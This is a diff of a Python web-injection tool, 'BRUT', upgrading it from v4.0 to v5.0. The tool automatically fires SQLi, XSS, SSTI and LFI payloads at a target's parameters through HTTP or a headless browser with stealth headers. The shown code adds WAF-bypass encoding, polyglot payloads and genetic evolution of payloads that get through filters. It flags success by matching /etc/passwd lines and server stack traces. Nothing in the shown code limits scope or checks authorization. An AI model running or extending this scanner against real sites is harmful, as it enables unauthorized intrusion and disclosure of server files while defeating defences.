-        r"express.*?error", r"referenceerror", r"typeerror",
-        r"action\s*controller.*?exception",
-        r"rails", r"activerecord", r"nomethoderror",
-        r"failed\s+to\s+open\s+stream", r"open_basedir",
-        r"permission\s+denied", r"no\s+such\s+file\s+or\s+directory",
-        r"file_exists$$", r"fopen$$",
-        r"xdebug", r"var_dump", r"print_r", r"debug.*?trace",
-        r"stack\s*trace", r"call\s+stack",
+        r"traceback.*?(most\s+recent|innermost)",r"django",
+        r"werkzeug",r"flask",r"python.*?error",
+        r"jinja2.*?exception",r"template.*?error",
+        r"java\.lang\.",r"at\s+[a-zA-Z]+\.[a-zA-Z]+$",
+        r"exception\s+in\s+thread",r"apache\s*tomcat",
+        r"javax\.servlet",r"org\.springframework",
+        r"asp\.net",r"\.net\s*framework",r"system\.web",
+        r"server\s*error\s*in\s*'[^']+'\s*application",
+        r"node\.js",r"express.*?error",r"referenceerror",r"typeerror",
+        r"rails",r"activerecord",r"nomethoderror",
+        r"failed\s+to\s+open\s+stream",r"open_basedir",
+        r"permission\s+denied",r"no\s+such\s+file\s+or\s+directory",
+        r"xdebug",r"var_dump",r"print_r",r"debug.*?trace",
+        r"stack\s*trace",r"call\s+stack",
     ]
-
     WAF_BLOCK_PATTERNS = [
-        r"blocked\s+by", r"access\s+denied", r"forbidden",
-        r"security\s+block", r"request\s+rejected",
-        r"suspicious\s+activity", r"malicious\s+request",
-        r"incapsula", r"cloudflare", r"akamai",
-        r"imperva", r"sucuri", r"mod_security",
-        r"403\s+forbidden", r"406\s+not\s+acceptable",
-        r"503\s+service\s+unavailable.*?waf",
+        r"blocked\s+by",r"access\s+denied",r"forbidden",
+        r"security\s+block",r"request\s+rejected",
+        r"suspicious\s+activity",r"malicious\s+request",
+        r"incapsula",r"cloudflare",r"akamai",
+        r"imperva",r"sucuri",r"mod_security",
         r"your\s+request\s+has\s+been\s+blocked",
-        r"firewall", r"protected\s+by",
+        r"firewall",r"protected\s+by",
     ]
-
-    LFI_SUCCESS_PATTERNS = [
-        r"root:[x*]:0:0:", r"daemon:", r"bin:",
-        r"nobody:", r"www-data:",
-    ]
+    LFI_SUCCESS_PATTERNS = [r"root:[x*]:0:0:",r"daemon:",r"www-data:",r"bin:",r"nobody:"]
 
     def __init__(self):
         self.server_patterns = [re.compile(p, re.I) for p in self.SERVER_ERROR_PATTERNS]
         self.waf_patterns = [re.compile(p, re.I) for p in self.WAF_BLOCK_PATTERNS]
         self.lfi_patterns = [re.compile(p, re.I) for p in self.LFI_SUCCESS_PATTERNS]
 
-    def analyze(self, response_text: str, status_code: int,
-                response_time: float) -> Tuple[str, str, bool, str]:
-        """Returns: (response_type, evidence, success, response_snippet)"""
+    def analyze(self, response_text, status_code, response_time):
         text = response_text or ""
         snippet = ""
+        anomaly = 0.0
 
-        # 1. WAF block
-        for pattern in self.waf_patterns:
-            match = pattern.search(text)
-            if match:
-                snippet = self._extract_snippet(text, match.start())
-                return ("blocked", f"WAF: {match.group(0)[:40]}", False, snippet)
+        for p in self.waf_patterns:
+            m = p.search(text)
+            if m:
+                snippet = self._extract_snippet(text, m.start())
+                anomaly = 85.0
+                return ("blocked", f"WAF: {m.group(0)[:40]}", False, snippet, anomaly)
 
         if status_code in [403, 406, 429, 503]:
-            snippet = self._extract_snippet(text, 0)
-            return ("blocked", f"Status {status_code}", False, snippet[:80])
+            anomaly = 70.0 + (status_code - 400)
+            return ("blocked", f"Status {status_code}", False, text[:60], anomaly)
 
-        # 2. LFI success
-        for pattern in self.lfi_patterns:
-            match = pattern.search(text)
-            if match:
-                return ("server_output", f"LFI: {match.group(0)[:60]}", True, match.group(0)[:60])
+        for p in self.lfi_patterns:
+            m = p.search(text)
+            if m:
+                anomaly = 100.0
+                return ("server_output", f"LFI: {m.group(0)[:60]}", True, m.group(0)[:60], anomaly)
 
-        # 3. Server error
-        for pattern in self.server_patterns:
-            match = pattern.search(text)
-            if match:
-                evidence = match.group(0)[:80]
-                snippet = self._extract_snippet(text, match.start())
-                return ("server_output", f"Error: {evidence}", True, snippet)
+        for p in self.server_patterns:
+            m = p.search(text)
+            if m:
+                snippet = self._extract_snippet(text, m.start())
+                anomaly = 90.0
+                return ("server_output", f"Error: {m.group(0)[:80]}", True, snippet, anomaly)
 
-        # 4. Time-based
         if response_time > 4500:
-            return ("server_output", f"Delay: {response_time:.0f}ms", True, f"[Delay {response_time:.0f}ms]")
+            anomaly = 80.0
+            return ("server_output", f"Delay: {response_time:.0f}ms", True, f"[Delay {response_time:.0f}ms]", anomaly)
 
-        # 5. Stack trace
         if re.search(r"(?i)stack\s*trace|call\s*stack|backtrace", text):
-            snippet = self._extract_snippet(text, 0)
-            return ("server_output", "Stack trace", True, snippet[:80])
+            anomaly = 85.0
+            return ("server_output", "Stack trace", True, text[:80], anomaly)
 
-        # 6. Default: raw HTML
         snippet = self._extract_snippet(text, 0)
-        return ("raw_html", "Normal response", False, snippet[:60])
+        anomaly = 10.0
+        return ("raw_html", "Normal response", False, snippet[:60], anomaly)
 
-    def _extract_snippet(self, text: str, pos: int) -> str:
-        if not text:
-            return "[empty]"
+    def _extract_snippet(self, text, pos):
+        if not text: return "[empty]"
         clean = re.sub(r'<[^>]+>', ' ', text)
         clean = re.sub(r'\s+', ' ', clean).strip()
         if pos > 0 and pos < len(clean):
-            start = max(0, pos - 20)
-            end = min(len(clean), pos + 60)
-            return clean[start:end].strip()
+            s = max(0, pos-20); e = min(len(clean), pos+60)
+            return clean[s:e].strip()
         return clean[:80] if clean else "[empty]"
 
 
 # ============================================================
-# INJECTOR (HTTP + Browser)
+# INJECTOR (HTTP + Browser, preserved from v4.0 + WAF bypass)
 # ============================================================
 class Injector:
-    def __init__(self, target: str):
+    def __init__(self, target):
         self.target = target
         self.client = get_stealth_client()
         self.analyzer = ResponseAnalyzer()
+        self.waf_bypass = WAFBypassEngine()
         self.browser = None
 
     def _init_browser(self):
-        if self.browser or not HAS_PLAYWRIGHT:
-            return
+        if self.browser or not HAS_PLAYWRIGHT: return
         try:
             self._pw = sync_playwright().start()
             self.browser = self._pw.chromium.launch(headless=True)
-        except Exception:
-            self.browser = None
+        except: self.browser = None
 
     def _close_browser(self):
         if self.browser:
-            try:
-                self.browser.close()
-                self._pw.stop()
-            except:
-                pass
+            try: self.browser.close(); self._pw.stop()
+            except: pass
 
-    def inject(self, param: Parameter, payload_dict: Dict,
-               use_browser: bool = False) -> Optional[InjectionResult]:
+    def inject(self, param, payload_dict, use_browser=False):
         payload = payload_dict["payload"]
+        gen_id = payload_dict.get("generation_id", "")
         try:
-            start_time = time.time()
+            start = time.time()
             if use_browser and param.location == "form_input":
-                response_text, status, resp_time, resp_size = self._inject_browser(param, payload)
+                rt, st, rpt, rsz = self._inject_browser(param, payload)
             else:
-                response_text, status, resp_time, resp_size = self._inject_http(param, payload)
+                rt, st, rpt, rsz = self._inject_http(param, payload)
+            elapsed = rpt if rpt > 0 else (time.time()-start)*1000
+            resp_type, evidence, success, snippet, anomaly = self.analyzer.analyze(rt, st, elapsed)
 
-            elapsed_ms = resp_time if resp_time > 0 else (time.time() - start_time) * 1000
-
-            resp_type, evidence, success, snippet = self.analyzer.analyze(
-                response_text, status, elapsed_ms
-            )
+            # Detect injection context
+            ctx = InjectionContext.UNKNOWN
+            if rt:
+                detector = ContextDetector()
+                ctx = detector.detect_context(rt, param.name, param.original_value or "1")
 
             return InjectionResult(
-                payload_id=payload_dict["id"],
-                payload=payload,
-                category=payload_dict["category"],
-                parameter=param.name,
-                url=param.url,
-                method=param.method,
-                status_code=status,
-                response_time_ms=elapsed_ms,
-                response_size=resp_size,
-                response_type=resp_type,
-                evidence=evidence,
-                response_snippet=snippet,
-                success=success,
+                payload_id=payload_dict["id"], payload=payload,
+                category=payload_dict["category"], parameter=param.name,
+                url=param.url, method=param.method, status_code=st,
+                response_time_ms=elapsed, response_size=rsz,
+                response_type=resp_type, evidence=evidence,
+                response_snippet=snippet, success=success,
+                anomaly_score=anomaly, injection_context=ctx.value,
+                generation_id=gen_id,
                 timestamp=datetime.now().isoformat(),
             )
-
         except Exception as e:
             return InjectionResult(
-                payload_id=payload_dict["id"],
-                payload=payload,
-                category=payload_dict["category"],
-                parameter=param.name,
-                url=param.url,
-                method=param.method,
-                status_code=0,
-                response_time_ms=0,
-                response_size=0,
-                response_type="blocked",
-                evidence=f"Error: {str(e)[:80]}",
-                response_snippet="[connection failed]",
-                success=False,
+                payload_id=payload_dict["id"], payload=payload,
+                category=payload_dict["category"], parameter=param.name,
+                url=param.url, method=param.method, status_code=0,
+                response_time_ms=0, response_size=0,
+                response_type="blocked", evidence=f"Error: {str(e)[:80]}",
+                response_snippet="[connection failed]", success=False,
+                anomaly_score=0, injection_context="unknown",
+                generation_id=gen_id,
                 timestamp=datetime.now().isoformat(),
             )
 
-    def _inject_http(self, param: Parameter, payload: str) -> Tuple[str, int, float, int]:
+    def _inject_http(self, param, payload):
         start = time.time()
-        response_text = ""
-        status = 0
-        resp_size = 0
         try:
             if self.client:
                 if param.method == "GET":
                     resp = self.client.get(param.url, params={param.name: payload}, timeout=20)
                 else:
                     resp = self.client.post(param.url, data={param.name: payload}, timeout=20)
-                response_text = resp.text
-                status = resp.status_code
-                resp_size = len(resp.content)
+                return resp.text, resp.status_code, (time.time()-start)*1000, len(resp.content)
             elif HAS_REQUESTS:
-                headers = {"User-Agent": random.choice(STEALTH_HEADERS)}
+                h = {"User-Agent": random.choice(STEALTH_HEADERS)}
                 if param.method == "GET":
-                    resp = requests.get(param.url, params={param.name: payload},
-                                       headers=headers, timeout=20, verify=False)
+                    resp = requests.get(param.url, params={param.name: payload}, headers=h, timeout=20, verify=False)
                 else:
-                    resp = requests.post(param.url, data={param.name: payload},
-                                        headers=headers, timeout=20, verify=False)
-                response_text = resp.text
-                status = resp.status_code
-                resp_size = len(resp.content)
-            resp_time = (time.time() - start) * 1000
-            return response_text, status, resp_time, resp_size
-        except Exception:
-            resp_time = (time.time() - start) * 1000
-            return "", 0, resp_time, 0
+                    resp = requests.post(param.url, data={param.name: payload}, headers=h, timeout=20, verify=False)
+                return resp.text, resp.status_code, (time.time()-start)*1000, len(resp.content)
+        except: pass
+        return "", 0, (time.time()-start)*1000, 0
 
-    def _inject_browser(self, param: Parameter, payload: str) -> Tuple[str, int, float, int]:
-        if not self.browser:
-            self._init_browser()
-        if not self.browser:
-            return self._inject_http(param, payload)
+    def _inject_browser(self, param, payload):
+        if not self.browser: self._init_browser()
+        if not self.browser: return self._inject_http(param, payload)
         start = time.time()
         try:
             page = self.browser.new_page()
             page.goto(param.url, timeout=15000)
             time.sleep(1)
-            selectors = [
-                f'input[name="{param.name}"]',
-                f'textarea[name="{param.name}"]',
-                f'select[name="{param.name}"]',
-                f'#{param.name}',
-            ]
-            filled = False
-            for sel in selectors:
+            for sel in [f'input[name="{param.name}"]', f'textarea[name="{param.name}"]',
+                       f'select[name="{param.name}"]', f'#{param.name}']:
                 try:
-                    elem = page.query_selector(sel)
-                    if elem:
-                        elem.fill(payload)
-                        filled = True
-                        break
-                except:
-                    continue
-            if filled:
-                try:
-                    page.click('button[type="submit"], input[type="submit"]')
-                    page.wait_for_load_state("networkidle", timeout=5000)
-                except:
-                    pass
+                    el = page.query_selector(sel)
+                    if el: el.fill(payload); break
+                except: continue
+            try:
+                page.click('button[type="submit"], input[type="submit"]')
+                page.wait_for_load_state("networkidle", timeout=5000)
+            except: pass
             time.sleep(1)
-            response_text = page.content()
-            resp_size = len(response_text)
-            resp_time = (time.time() - start) * 1000
+            rt = page.content(); rsz = len(rt)
+            rpt = (time.time()-start)*1000
             page.close()
-            return response_text, 200, resp_time, resp_size
-        except Exception:
-            resp_time = (time.time() - start) * 1000
-            return "", 0, resp_time, 0
+            return rt, 200, rpt, rsz
+        except:
+            return "", 0, (time.time()-start)*1000, 0
 
-    def close(self):
-        self._close_browser()
+    def close(self): self._close_browser()
 
 
 # ============================================================
-# REPORT SAVER
+# REPORT SAVER (enhanced with evolution log)
 # ============================================================
 class ReportSaver:
-    def __init__(self, target: str, output_dir: str = "./brut_results"):
+    def __init__(self, target, output_dir="./brut_results"):
         self.target = target
         self.parsed = urlparse(target)
         self.domain = self.parsed.netloc or self.parsed.path
@@ -2259,106 +2967,72 @@ class ReportSaver:
         self.output_dir = output_dir
         os.makedirs(output_dir, exist_ok=True)
 
-    def save(self, results: List[InjectionResult], payloads: List[Dict],
-             learner: FeedbackLearner = None) -> Tuple[str, str]:
+    def save(self, results, payloads, learner=None, schema=None, evolver=None):
         now = datetime.now()
-        year = now.strftime("%Y")
-        month = now.strftime("%m")
-        day = now.strftime("%d")
+        folder = os.path.join(self.output_dir, f"list-payload-for-{self.domain_clean}-{now.strftime('%Y')}")
+        os.makedirs(folder, exist_ok=True)
+        base = now.strftime("%m_%d")
+        txt_path = os.path.join(folder, f"{base}.txt")
+        json_path = os.path.join(folder, f"{base}.json")
 
-        folder_name = f"list-payload-for-{self.domain_clean}-{year}"
-        folder_path = os.path.join(self.output_dir, folder_name)
-        os.makedirs(folder_path, exist_ok=True)
-
-        base_name = f"{month}_{day}"
-        txt_path = os.path.join(folder_path, f"{base_name}.txt")
-        json_path = os.path.join(folder_path, f"{base_name}.json")
-
-        server_response = [r for r in results if r.response_type == "server_output"]
-        raw_html = [r for r in results if r.response_type == "raw_html"]
+        server = [r for r in results if r.response_type == "server_output"]
+        raw = [r for r in results if r.response_type == "raw_html"]
         blocked = [r for r in results if r.response_type == "blocked"]
 
-        # === TXT FILE ===
         with open(txt_path, "w", encoding="utf-8") as f:
-            f.write("=" * 80 + "\n")
-            f.write(f"  BRUT v4.0 PAYLOAD INJECTION REPORT\n")
-            f.write(f"  Target    : {self.target}\n")
-            f.write(f"  Domain    : {self.domain}\n")
-            f.write(f"  Date      : {now.strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write(f"  Total     : {len(results)} payloads tested\n")
-            if learner:
-                f.write(f"  ML Learn  : {learner.get_learning_summary()}\n")
-            f.write("=" * 80 + "\n\n")
+            f.write(f"{'='*80}\n  BRUT v5.0 — Genetic ML Payload Evolution Report\n")
+            f.write(f"  Target: {self.target}\n")
+            f.write(f"  Date: {now.strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"  Total: {len(results)} payloads tested\n")
+            if learner: f.write(f"  ML: {learner.get_learning_summary()}\n")
+            if evolver: f.write(f"  Genetic: {evolver.get_generation_summary()}\n")
+            f.write(f"{'='*80}\n\n")
 
-            # Server Response (SUCCESS)
-            f.write("=" * 80 + "\n")
-            f.write(f"[✓] PAYLOAD BERHASIL (Server Output, Bukan Raw HTML)\n")
-            f.write(f"    Jumlah: {len(server_response)}\n")
-            f.write("=" * 80 + "\n\n")
+            f.write(f"[✓] SERVER OUTPUT (SUCCESS): {len(server)}\n{'='*80}\n\n")
+            for i, r in enumerate(server, 1):
+                f.write(f"#{i} | {r.payload_id} | {r.category} | {r.parameter}\n")
+                f.write(f"   Status: {r.status_code} ({get_status_meaning(r.status_code)})\n")
+                f.write(f"   Time: {r.response_time_ms:.0f}ms | Anomaly: {r.anomaly_score:.1f}\n")
+                f.write(f"   Context: {r.injection_context}\n")
+                f.write(f"   Evidence: {r.evidence}\n")
+                f.write(f"   Snippet: {r.response_snippet}\n")
+                f.write(f"   Payload: {r.payload[:300]}\n\n")
 
-            for i, r in enumerate(server_response, 1):
-                f.write(f"--- #{i} ---\n")
-                f.write(f"  ID        : {r.payload_id}\n")
-                f.write(f"  Category  : {r.category}\n")
-                f.write(f"  Parameter : {r.parameter}\n")
-                f.write(f"  URL       : {r.url}\n")
-                f.write(f"  Method    : {r.method}\n")
-                f.write(f"  Status    : {r.status_code} ({get_status_meaning(r.status_code)})\n")
-                f.write(f"  Time      : {r.response_time_ms:.0f}ms\n")
-                f.write(f"  Evidence  : {r.evidence}\n")
-                f.write(f"  Snippet   : {r.response_snippet}\n")
-                f.write(f"  Payload   : {r.payload[:300]}\n\n")
+            f.write(f"\n[~] RAW HTML: {len(raw)}\n{'='*80}\n\n")
+            for i, r in enumerate(raw, 1):
+                f.write(f"#{i} | {r.payload_id} | {r.category} | {r.parameter} | {r.payload[:200]}\n")
 
-            # Raw HTML
-            f.write("\n" + "=" * 80 + "\n")
-            f.write(f"[~] PAYLOAD RESPON RAW HTML\n")
-            f.write(f"    Jumlah: {len(raw_html)}\n")
-            f.write("=" * 80 + "\n\n")
-
-            for i, r in enumerate(raw_html, 1):
-                f.write(f"--- #{i} ---\n")
-                f.write(f"  ID        : {r.payload_id}\n")
-                f.write(f"  Category  : {r.category}\n")
-                f.write(f"  Parameter : {r.parameter}\n")
-                f.write(f"  Status    : {r.status_code} ({get_status_meaning(r.status_code)})\n")
-                f.write(f"  Payload   : {r.payload[:200]}\n\n")
-
-            # Blocked
-            f.write("\n" + "=" * 80 + "\n")
-            f.write(f"[✗] PAYLOAD DIBLOKIR\n")
-            f.write(f"    Jumlah: {len(blocked)}\n")
-            f.write("=" * 80 + "\n\n")
-
+            f.write(f"\n[✗] BLOCKED: {len(blocked)}\n{'='*80}\n\n")
             for i, r in enumerate(blocked, 1):
-                f.write(f"--- #{i} ---\n")
-                f.write(f"  ID        : {r.payload_id}\n")
-                f.write(f"  Category  : {r.category}\n")
-                f.write(f"  Parameter : {r.parameter}\n")
-                f.write(f"  Status    : {r.status_code} ({get_status_meaning(r.status_code)})\n")
-                f.write(f"  Evidence  : {r.evidence}\n")
-                f.write(f"  Payload   : {r.payload[:200]}\n\n")
+                f.write(f"#{i} | {r.payload_id} | {r.category} | {r.parameter} | {r.evidence}\n")
 
-            f.write("\n" + "=" * 80 + "\nEND OF REPORT\n" + "=" * 80 + "\n")
-
-        # === JSON FILE ===
-        json_data = {
-            "meta": {
-                "target": self.target, "domain": self.domain,
-                "timestamp": now.isoformat(),
-                "total_payloads": len(results),
-                "server_response_count": len(server_response),
-                "raw_html_count": len(raw_html),
-                "blocked_count": len(blocked),
-                "ml_learning": learner.get_learning_summary() if learner else "",
-            },
-            "server_response": [r.to_dict() for r in server_response],
-            "raw_html": [r.to_dict() for r in raw_html],
-            "blocked": [r.to_dict() for r in blocked],
-            "all_payloads": payloads,
-        }
+            if schema:
+                f.write(f"\n\n{'='*80}\n  EVOLUTION LOG\n{'='*80}\n\n")
+                evo_log = schema.get_evolution_log()
+                for entry in evo_log[-50:]:
+                    f.write(f"  Gen {entry['gen_num']} | {entry['gen_id']} | "
+                           f"{entry['category']} | fit={entry['fitness']:.3f} | "
+                           f"alive={entry['alive']} | muts={entry['mutations']}\n")
 
         with open(json_path, "w", encoding="utf-8") as f:
-            json.dump(json_data, f, indent=2, ensure_ascii=False)
+            json.dump({
+                "meta": {
+                    "target": self.target, "domain": self.domain,
+                    "timestamp": now.isoformat(),
+                    "total": len(results), "success": len(server),
+                    "raw_html": len(raw), "blocked": len(blocked),
+                    "ml": learner.get_learning_summary() if learner else "",
+                    "genetic": evolver.get_generation_summary() if evolver else "",
+                    "version": "5.0",
+                },
+                "server_response": [r.to_dict() for r in server],
+                "raw_html": [r.to_dict() for r in raw],
+                "blocked": [r.to_dict() for r in blocked],
+                "all_payloads": payloads,
+                "evolution_log": schema.get_evolution_log() if schema else [],
+                "blocked_mutations": list(schema.blocked_mutations) if schema else [],
+                "successful_chains": schema.successful_chains if schema else [],
+            }, f, indent=2, ensure_ascii=False)
 
         return txt_path, json_path
 
@@ -2368,7 +3042,7 @@ class ReportSaver:
 # ============================================================
 class DetailedLogger:
     @staticmethod
-    def log_result(index: int, total: int, result: InjectionResult):
+    def log_result(index, total, result):
         if result.success:
             symbol = "\033[1;32m[✓]\033[0m"
         elif result.response_type == "raw_html":
@@ -2388,55 +3062,70 @@ class DetailedLogger:
             type_label = "\033[31mBLOCKED\033[0m"
 
         payload_display = result.payload[:80].replace('\n', '\\n').replace('\r', '\\r')
-        if len(result.payload) > 80:
-            payload_display += "..."
-
+        if len(result.payload) > 80: payload_display += "..."
         snippet = result.response_snippet[:60].replace('\n', ' ').replace('\r', '')
 
         print(f"  {symbol} \033[33m[{index}/{total}]\033[0m "
-              f"\033[35m{result.category:<6}\033[0m → "
+              f"\033[35m{result.category:<8}\033[0m → "
               f"\033[37m{result.parameter:<12}\033[0m | "
               f"{type_label} | "
               f"Status: {status_str} ({status_meaning[:25]}) | "
               f"⏱ {time_str}")
 
         print(f"         \033[90mPayload : \033[0m{payload_display}")
-
         if snippet:
             print(f"         \033[90mResponse: \033[0m{snippet}")
-
         if result.success:
             print(f"         \033[1;32m⚡ Evidence: {result.evidence}\033[0m")
+            print(f"         \033[1;36m📍 Context: {result.injection_context} | Anomaly: {result.anomaly_score:.1f}\033[0m")
             print()
 
 
 # ============================================================
-# MAIN PIPELINE
+# MAIN PIPELINE v5.0
 # ============================================================
 class BRUTPipeline:
-    def __init__(self, target: str):
+    def __init__(self, target):
         self.target = target
         self.parameters: List[Parameter] = []
         self.payloads: List[Dict] = []
         self.results: List[InjectionResult] = []
         self.learner = FeedbackLearner()
-        self.generator = MLPayloadGenerator(self.learner)
+        self.schema = EvolutionSchema()
+        self.grammar = GrammarValidator()
+        self.encoder = AdaptiveEncodingRotation()
+        self.waf_bypass = WAFBypassEngine()
+        self.polyglot = PolyglotGenerator()
+        self.context_detector = ContextDetector()
+
+        self.generator = MLPayloadGenerator(
+            self.learner, self.grammar, self.encoder,
+            self.waf_bypass, self.polyglot
+        )
+        self.evolver = GeneticEvolver(
+            self.schema, self.grammar, self.encoder, self.waf_bypass
+        )
         self.injector = Injector(target)
         self.saver = ReportSaver(target)
         self.logger = DetailedLogger()
 
-    def phase1_discover(self) -> List[Parameter]:
+    def phase1_discover(self):
         discovery = ParameterDiscovery(self.target)
         self.parameters = discovery.run()
         return self.parameters
 
-    def phase2_generate(self, count: int) -> List[Dict]:
-        if count <= 0:
-            return []
+    def phase2_generate(self, count):
+        if count <= 0: return []
         self.payloads = self.generator.generate(count)
+        # Initialize genetic population
+        self.evolver.initialize_population(self.payloads)
+        # Create evolution records
+        for p in self.payloads:
+            record = self.schema.create_record(p)
+            p["generation_id"] = record.generation_id
         return self.payloads
 
-    def phase3_inject(self, max_mode: bool = False) -> List[InjectionResult]:
+    def phase3_inject(self, max_mode=False):
         self.results = []
         total = len(self.payloads) * len(self.parameters)
         tested = 0
@@ -2444,15 +3133,12 @@ class BRUTPipeline:
 
         print(f"\n\033[36m[*]\033[0m Starting injection: "
               f"{len(self.payloads)} payloads × {len(self.parameters)} parameters")
-        print(f"    Total tests: {total}")
-        print(f"    Mode: {'MAX (stop on first success)' if max_mode else 'NORMAL'}")
-        print(f"    ML: Adaptive learning active\n")
+        print(f"    Total: {total} | Mode: {'MAX' if max_mode else 'NORMAL'}")
+        print(f"    Genetic: Active | Grammar: Validated | Encoding: {self.encoder.get_rotation_summary()}")
         print(f"\033[33m{'─'*100}\033[0m")
 
         for param in self.parameters:
-            if max_mode and found_success:
-                break
-
+            if max_mode and found_success: break
             for payload_dict in self.payloads:
                 tested += 1
                 result = self.injector.inject(param, payload_dict)
@@ -2460,62 +3146,97 @@ class BRUTPipeline:
                 if result:
                     self.results.append(result)
                     self.learner.record_feedback(payload_dict, result)
+
+                    # Record in evolution schema
+                    gen_id = payload_dict.get("generation_id", "")
+                    if gen_id:
+                        self.schema.record_feedback(
+                            gen_id, result.status_code,
+                            result.evidence, result.response_type,
+                            result.anomaly_score,
+                            self.learner.waf_type if self.learner.waf_detected else ""
+                        )
+
+                    # Update genetic fitness
+                    fitness = self.schema.records.get(gen_id, None)
+                    if fitness:
+                        self.evolver.update_fitness(
+                            payload_dict["id"],
+                            fitness.fitness_score
+                        )
+
+                    # Update encoding rotation
+                    self.encoder.record_result(
+                        self.encoder.current_chain_index,
+                        result.success
+                    )
+
                     self.logger.log_result(tested, total, result)
 
                     if result.success:
                         found_success = True
-                        if max_mode:
-                            break
+                        if max_mode: break
 
-                # Adaptive rate limiting
+                # Rate limiting
                 if result and result.response_time_ms > 3000:
                     time.sleep(random.uniform(0.5, 1.0))
                 else:
                     time.sleep(random.uniform(0.08, 0.25))
 
-                # Periodic ML summary
+                # Periodic summaries
                 if tested % 50 == 0 and tested > 0:
-                    ml_summary = self.learner.get_learning_summary()
-                    if ml_summary != "Learning...":
-                        print(f"\n  \033[1;36m[ML]\033[0m Learning: {ml_summary}")
-                        print(f"  \033[1;36m[ML]\033[0m Weights: "
-                              f"sqli={self.learner.category_weights.get('sqli', 0):.2f}, "
-                              f"xss={self.learner.category_weights.get('xss', 0):.2f}, "
-                              f"ssti={self.learner.category_weights.get('ssti', 0):.2f}\n")
+                    ml = self.learner.get_learning_summary()
+                    if ml != "Learning...":
+                        print(f"\n  \033[1;36m[ML]\033[0m {ml}")
+                        print(f"  \033[1;36m[GENETIC]\033[0m {self.evolver.get_generation_summary()}")
+                        print(f"  \033[1;36m[ENCODING]\033[0m {self.encoder.get_rotation_summary()}\n")
+
+                if tested % 100 == 0 and tested > 0:
+                    # Evolve next generation
+                    new_pop = self.evolver.evolve_generation()
+                    print(f"\n  \033[1;35m[EVOLUTION]\033[0m Generation {self.evolver.generation}: "
+                          f"{len(new_pop)} evolved payloads ready\n")
+                    # Replace payloads with evolved ones for remaining params
+                    self.payloads = new_pop
+                    for p in self.payloads:
+                        if "generation_id" not in p:
+                            record = self.schema.create_record(p)
+                            p["generation_id"] = record.generation_id
 
         print(f"\033[33m{'─'*100}\033[0m")
         return self.results
 
-    def phase3_advanced_retry(self) -> List[InjectionResult]:
+    def phase3_advanced_retry(self):
         failed = [r for r in self.results if r.response_type in ["raw_html", "blocked"]]
-        if not failed:
-            return []
+        if not failed: return []
 
-        print(f"\n\033[33m[*]\033[0m ML evolving: generating advanced variants from {len(failed)} failed...")
+        print(f"\n\033[33m[*]\033[0m ML evolving: advanced variants from {len(failed)} failed...")
+        print(f"    Negative selection: {len(self.learner.blocked_mutations)} mutations blacklisted")
 
         failed_dicts = [{"id": r.payload_id, "category": r.category, "payload": r.payload}
                         for r in failed]
-        advanced_payloads = self.generator.generate_advanced_batch(failed_dicts)
-        print(f"    Generated {len(advanced_payloads)} advanced variants\n")
+        adv = self.generator.generate_advanced_batch(failed_dicts)
+        print(f"    Generated {len(adv)} advanced variants\n")
 
-        advanced_results = []
-        total_adv = len(advanced_payloads) * len(self.parameters)
+        adv_results = []
+        total_adv = len(adv) * len(self.parameters)
         tested = 0
 
         for param in self.parameters:
-            for payload_dict in advanced_payloads:
+            for pd in adv:
                 tested += 1
-                result = self.injector.inject(param, payload_dict)
+                result = self.injector.inject(param, pd)
                 if result:
-                    advanced_results.append(result)
-                    self.learner.record_feedback(payload_dict, result)
+                    adv_results.append(result)
+                    self.learner.record_feedback(pd, result)
                     self.logger.log_result(tested, total_adv, result)
 
-        self.results.extend(advanced_results)
-        return advanced_results
+        self.results.extend(adv_results)
+        return adv_results
 
-    def phase4_save(self) -> Tuple[str, str]:
-        return self.saver.save(self.results, self.payloads, self.learner)
+    def phase4_save(self):
+        return self.saver.save(self.results, self.payloads,
+                              self.learner, self.schema, self.evolver)
 
     def print_summary(self):
         server = [r for r in self.results if r.response_type == "server_output"]
@@ -2523,30 +3244,33 @@ class BRUTPipeline:
         blocked = [r for r in self.results if r.response_type == "blocked"]
 
         print(f"\n\033[1;36m{'='*80}")
-        print(f"  BRUT v4.0 INJECTION SUMMARY")
+        print(f"  BRUT v5.0 — GENETIC ML INJECTION SUMMARY")
         print(f"{'='*80}\033[0m")
-        print(f"  Total payloads tested  : {len(self.results)}")
-        print(f"  \033[32m✓ Server output (SUCCESS)\033[0m : {len(server)}")
-        print(f"  \033[37m~ Raw HTML response    \033[0m  : {len(raw)}")
-        print(f"  \033[31m✗ Blocked/no response  \033[0m  : {len(blocked)}")
+        print(f"  Total tested         : {len(self.results)}")
+        print(f"  \033[32m✓ Server output\033[0m      : {len(server)}")
+        print(f"  \033[37m~ Raw HTML\033[0m           : {len(raw)}")
+        print(f"  \033[31m✗ Blocked\033[0m            : {len(blocked)}")
 
-        print(f"\n  \033[1;35mML Learning Summary:\033[0m")
-        print(f"    {self.learner.get_learning_summary()}")
+        print(f"\n  \033[1;35mML Learning:\033[0m {self.learner.get_learning_summary()}")
+        print(f"  \033[1;35mGenetic:\033[0m {self.evolver.get_generation_summary()}")
+        print(f"  \033[1;35mEncoding:\033[0m {self.encoder.get_rotation_summary()}")
+
+        self.schema.print_evolution_summary()
+
+        if self.learner.blocked_mutations:
+            print(f"\n  \033[1;31mNegative Selection (Blacklisted Mutations):\033[0m")
+            print(f"    {list(self.learner.blocked_mutations)}")
 
         if self.learner.successful_patterns:
             print(f"\n  \033[1;32mSuccessful Patterns:\033[0m")
             for sp in self.learner.successful_patterns[:5]:
-                print(f"    • [{sp['category']}] strategy={sp['strategy']} | {sp['evidence'][:50]}")
-
-        if self.learner.blocked_patterns:
-            print(f"\n  \033[1;31mBlocked Patterns (WAF):\033[0m")
-            for bp in self.learner.blocked_patterns[:3]:
-                print(f"    • [{bp['category']}] status={bp['status']} | {bp['payload_snippet'][:40]}")
+                muts = sp.get("mutations", [])
+                print(f"    • [{sp['category']}] {sp['strategy']} | muts={muts[:3]} | {sp['evidence'][:50]}")
 
         if server:
             print(f"\n  \033[1;32mTop Successful Payloads:\033[0m")
             for r in server[:5]:
-                print(f"    ✓ [{r.payload_id}] {r.category} → {r.evidence[:60]}")
+                print(f"    ✓ [{r.payload_id}] {r.category} | ctx={r.injection_context} | {r.evidence[:60]}")
 
 
 # ============================================================
@@ -2564,136 +3288,97 @@ def interactive_main():
         try:
             target = input(f"\n  \033[1;36mBRUT\033[0m \033[33m>>\033[0m ").strip()
         except (EOFError, KeyboardInterrupt):
-            print(f"\n\n\033[31m[*]\033[0m Exiting...")
-            break
